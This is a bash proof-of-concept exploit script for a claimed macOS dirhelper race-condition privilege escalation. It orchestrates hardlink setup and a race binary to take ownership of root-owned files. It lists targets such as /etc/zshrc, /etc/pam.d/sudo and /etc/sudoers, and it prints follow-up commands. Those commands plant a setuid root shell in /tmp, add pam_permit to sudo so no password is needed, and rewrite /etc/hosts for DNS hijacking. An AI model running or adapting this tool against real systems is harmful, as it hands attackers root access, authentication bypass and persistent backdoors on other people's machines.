#!/bin/bash
#
# exploit.sh - Glarus PoC Main Exploit Script
#
# Orchestrates the complete attack:
# 1. Sets up the hardlink structure
# 2. Starts the race condition binary
# 3. Triggers dirhelper repeatedly
# 4. Reports success or failure
#
# Usage:
#   ./exploit.sh <target_file>
#   ./exploit.sh --test <target_file>
#   ./exploit.sh --list
#
# Environment Variables:
#   GLARUS_MAX_ATTEMPTS  - Maximum race attempts (default: 50000)
#   GLARUS_RACE_MODE     - Race mode: spin, kqueue, hybrid (default: spin)
#   GLARUS_TRIGGERS      - Number of dirhelper triggers (default: 5000)
#
#
# CRITICAL FIX: The original design had separate trigger loop and race loop
# running asynchronously. This caused synchronization issues where the race
# binary would always detect directory creation AFTER lchown() completed.
#
# NEW DESIGN: The race binary now handles triggering internally.
# Each dirhelper trigger gets our full attention, maximizing our chance
# of hitting the race window.
#
# Copyright (c) 2025 Golden Helm Securities
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
BUILD_DIR="$ROOT_DIR/build"

BUNDLE_ID="${GLARUS_BUNDLE_ID:-com.glarus.poc}"
CONTAINER_BASE="$HOME/Library/Containers/$BUNDLE_ID"

CLIENT_APP="$BUILD_DIR/DirhelperClient.app/Contents/MacOS/DirhelperClient"
RACE_BINARY="$BUILD_DIR/race_swap"

# Configuration
MAX_ATTEMPTS="${GLARUS_MAX_ATTEMPTS:-5000}"
RACE_MODE="${GLARUS_RACE_MODE:-integrated}"
DEFAULT_TARGET="/etc/hosts"

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Helper Functions  
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

usage() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Glarus PoC - macOS dirhelper Privilege Escalation (FIXED)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
  ./exploit.sh <target_file>         Run exploit against target file
  ./exploit.sh --test <target_file>  Test if target can be exploited  
  ./exploit.sh --list                List suggested targets
  ./exploit.sh --help                Show this help

Environment Variables:
  GLARUS_MAX_ATTEMPTS=5000    Maximum race attempts (now actually used!)
  GLARUS_RACE_MODE=integrated Race mode: integrated (fixed), spin (legacy broken)

Examples:
  ./exploit.sh /etc/hosts
  ./exploit.sh /etc/zshrc
  GLARUS_MAX_ATTEMPTS=10000 ./exploit.sh /etc/newsyslog.conf

CRITICAL FIX:
  The 'integrated' mode fixes the synchronization bug in the original.
  Each dirhelper trigger now gets full attention from the race binary.

EOF
}

list_targets() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Suggested Target Files  
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Confirmed Exploitable (no TCC/SIP protection):
  /etc/hosts              DNS hijacking
  /etc/newsyslog.conf     Log rotation â†’ file overwrite
  /etc/asl.conf           System logging configuration
  /etc/zshrc              Code exec when root runs shell (sudo -s)
  /etc/zprofile           Code exec on root login shells
  /etc/resolv.conf        DNS resolver configuration

TCC Protected (may show consent dialog):
  /etc/pam.d/sudo         Bypass sudo authentication  
  /etc/pam.d/su           Bypass su authentication
  /etc/sudoers            Add NOPASSWD rule

SIP Protected (requires SIP disabled):
  /System/*               System files
  /usr/*                  User binaries

Test with: ./exploit.sh --test <target_file>

EOF
}

test_target() {
    local target="$1"
    local test_dir="/tmp/glarus_test_$$"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Testing Target: $target"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    
    if [ ! -f "$target" ]; then
        echo "[âœ—] File does not exist"
        return 1
    fi
    echo "[âœ“] File exists"
    
    if [ ! -r "$target" ]; then
        echo "[âœ—] File is not readable"
        return 1
    fi
    echo "[âœ“] File is readable"
    
    local target_fs=$(df "$target" 2>/dev/null | tail -1 | awk '{print $1}')
    local container_fs=$(df "$HOME/Library" 2>/dev/null | tail -1 | awk '{print $1}')
    
    if [ "$target_fs" != "$container_fs" ]; then
        echo "[âœ—] Different filesystems - hardlink will fail"
        return 1
    fi
    echo "[âœ“] Same filesystem"
    
    mkdir -p "$test_dir"
    if ln "$target" "$test_dir/test_link" 2>/dev/null; then
        echo "[âœ“] Hardlink creation successful"
        rm -rf "$test_dir"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ“ TARGET IS EXPLOITABLE"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Run: ./exploit.sh $target"
        return 0
    else
        rm -rf "$test_dir"
        echo "[âœ—] Hardlink creation failed (SIP/TCC protected?)"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ— TARGET IS NOT EXPLOITABLE"  
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        return 1
    fi
}

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Main Exploit Function
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

run_exploit() {
    local target="$1"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Glarus PoC - Running Exploit (FIXED)"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    echo "Bundle ID:    $BUNDLE_ID"
    echo "Target:       $target"
    echo "Race Mode:    $RACE_MODE"
    echo "Max Attempts: $MAX_ATTEMPTS"
    echo
    
    # Check build exists
    if [ ! -x "$CLIENT_APP" ]; then
        echo "ERROR: DirhelperClient not found."
        echo "       Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] DirhelperClient found"
    
    if [ ! -x "$RACE_BINARY" ]; then
        echo "ERROR: race_swap binary not found."
        echo "       Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] Race binary found"
    
    # Quick hardlink test
    local test_dir="/tmp/glarus_quick_$$"
    mkdir -p "$test_dir"
    if ! ln "$target" "$test_dir/test" 2>/dev/null; then
        echo "ERROR: Cannot create hardlink to $target"
        rm -rf "$test_dir"
        exit 1
    fi
    rm -rf "$test_dir"
    echo "[âœ“] Hardlink test passed"
    
    # Calculate buffer size
    local container_path="$CONTAINER_BASE/Data"
    local buffer_size=$((${#container_path} + 5))
    echo "[âœ“] Buffer size: $buffer_size (triggers truncation)"
    
    # Setup hardlink structure
    echo
    echo "[*] Setting up hardlink structure..."
    chmod +x "$SCRIPT_DIR/setup.sh" 2>/dev/null || true
    "$SCRIPT_DIR/setup.sh" "$target"
    
    # Record original owner
    local original_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    local my_uid=$(id -u)
    
    echo
    echo "[*] Starting integrated race (triggers handled internally)..."
    echo
    
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # CRITICAL FIX: 
    # The race binary now handles triggering internally.
    # No more async trigger loop - each trigger gets full attention!
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    local result=0
    "$RACE_BINARY" \
        -c "$BUNDLE_ID" \
        -t "$target" \
        -n "$MAX_ATTEMPTS" \
        -p "$CLIENT_APP" \
        -b "$buffer_size" \
        -m "$RACE_MODE" || result=$?
    
    echo
    
    # Check result
    local new_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    
    if [ "$new_owner" = "$my_uid" ]; then
        echo
        echo "  ðŸŽ‰ SUCCESS! You now own: $target"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "File ownership changed:"
        echo "  Before: uid=$original_owner (root)"
        echo "  After:  uid=$new_owner (you)"
        echo
        ls -la "$target"
        echo
        
        # Post-exploitation hints
        case "$target" in
            */zshrc|*/zprofile)
                echo "Next steps for privilege escalation:"
                echo "  # Add payload that runs when root spawns a shell:"
                echo "  echo 'if [ \"\$EUID\" -eq 0 ]; then cp /bin/zsh /tmp/rootsh && chmod 4755 /tmp/rootsh; fi' >> $target"
                echo "  sudo -s   # Triggers payload"
                echo "  /tmp/rootsh  # Root shell!"
                ;;
            */pam.d/sudo)
                echo "Next steps for privilege escalation:"
                echo "  echo 'auth sufficient pam_permit.so' | cat - $target > /tmp/sudo_new"
                echo "  cp /tmp/sudo_new $target"
                echo "  sudo -s   # No password required!"
                ;;
            */hosts)
                echo "You can now modify DNS entries:"
                echo "  echo '192.168.1.100 target-site.com' >> $target"
                ;;
            *)
                echo "You now have write access to this file."
                ;;
        esac
        echo
        return 0
    else
        echo
        echo "  âœ— Exploit did not succeed"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Owner unchanged: uid=$new_owner (wanted: $my_uid)"
        echo
        echo "Tips:"
        echo "  â€¢ Run again (race conditions are probabilistic)"
        echo "  â€¢ Increase attempts: GLARUS_MAX_ATTEMPTS=10000 ./exploit.sh $target"
        echo "  â€¢ Try different target: ./exploit.sh /etc/newsyslog.conf"
        echo
        return 1
    fi
}

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Main
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

# Fix script permissions if needed (GitHub ZIP strips them)
for script in "$SCRIPT_DIR"/*.sh; do
    [ -f "$script" ] && chmod +x "$script" 2>/dev/null || true
done

if [ $# -eq 0 ]; then
    usage
    exit 0
fi

case "$1" in
    --help|-h)
        usage
        ;;
    --list|-l)
        list_targets
        ;;
    --test|-t)
        if [ -z "$2" ]; then
            echo "Usage: $0 --test <target_file>"
            exit 1
        fi
        test_target "$2"
        ;;
    -*)
        echo "Unknown option: $1"
        usage
        exit 1
        ;;
    *)
        run_exploit "$1"
        ;;
esac
